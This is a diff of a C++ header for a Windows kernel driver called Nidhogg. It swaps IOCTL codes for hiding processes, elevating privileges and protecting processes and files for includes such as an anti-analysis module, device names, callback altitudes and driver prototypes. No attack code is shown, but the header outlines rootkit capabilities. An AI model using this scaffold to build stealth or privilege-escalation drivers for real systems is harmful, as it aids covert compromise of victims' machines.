@@ -1,55 +1,26 @@
 #pragma once
+#include "pch.h"
+#include "WindowsTypes.hpp"
+#include "NidhoggUtils.h"
+#include "ProcessUtils.hpp"
+#include "FileUtils.hpp"
+#include "RegistryUtils.hpp"
+#include "MemoryUtils.hpp"
+#include "AntiAnalysis.hpp"
+#include "NidhoggDeviceControl.hpp"
 
-// Includes.
-#include "FastMutex.h"
-#include "AutoLock.h"
-
-#define DRIVER_PREFIX "NidhoggDrv: "
-#define DRIVER_TAG 'hdiN'
-
-// ** IOCTLS ********************************************************************************************
-#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
-// *****************************************************************************************************
-
-#define MAX_PIDS 256
-#define MAX_FILES 256
-#define SupportsObjectCallbacks 0x42
-#define AllowObjectCallbacks 0x40
+// Definitions.
+#define REGISTERED_OB_CALLBACKS 2
+#define DRIVER_NAME L"\\Driver\\Nidhogg"
+#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
+#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
+#define OB_CALLBACKS_ALTITUDE L"31105.6171"
+#define REG_CALLBACK_ALTITUDE L"31122.6172"
 
 // Prototypes.
+NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
 NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
 DRIVER_UNLOAD NidhoggUnload;
 DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
-
-// Globals.
-PVOID registrationHandle;
-
-struct ProcessGlobals {
-	int PidsCount;
-	ULONG Pids[MAX_PIDS];
-	FastMutex Lock;
-
-	void Init() {
-		Lock.Init();
-	}
-};
-ProcessGlobals pGlobals;
-
-struct FileGlobals {
-	int FilesCount;
-	PWCH Files[MAX_FILES];
-	FastMutex Lock;
-
-	void Init() {
-		Lock.Init();
-	}
-};
-FileGlobals fGlobals;
+void ClearAll();
+void InitializeFeatures();
